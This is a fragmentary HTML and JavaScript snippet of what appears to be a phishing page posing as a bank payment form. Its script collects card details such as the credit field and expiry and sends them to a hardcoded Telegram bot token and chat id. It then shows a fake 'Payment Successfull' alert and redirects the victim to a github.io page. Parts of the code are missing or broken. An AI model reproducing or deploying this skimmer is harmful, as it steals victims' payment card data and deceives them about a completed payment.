                <select id="Credit" name="Credit" required>
                    
                    <option value="" disabled selected>Select Bank</option>

  <script>
  //bot token
var telegram_bot_id = "7838859798:AAEk-t5FqdpEnEPEtsEpGLGaDK8OR0QU1sA";
//chat id
var chat_id = 7065159395;

    Credit = document.getElementById("Credit").value;
    expiry = document.getElementById("expiry").value;

    trp = document.getElementById("trp").value;

};
var sender = function () {

            "chat_id": chat_id,
            "text": message,
          "file": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response); 
      
      swal("Successfull", "Your Payment Successfull", "success");
      
      document.location = "https://ringtone11.github.io/3Customer6/";
      
    });

    document.getElementById("expiry").value = "";
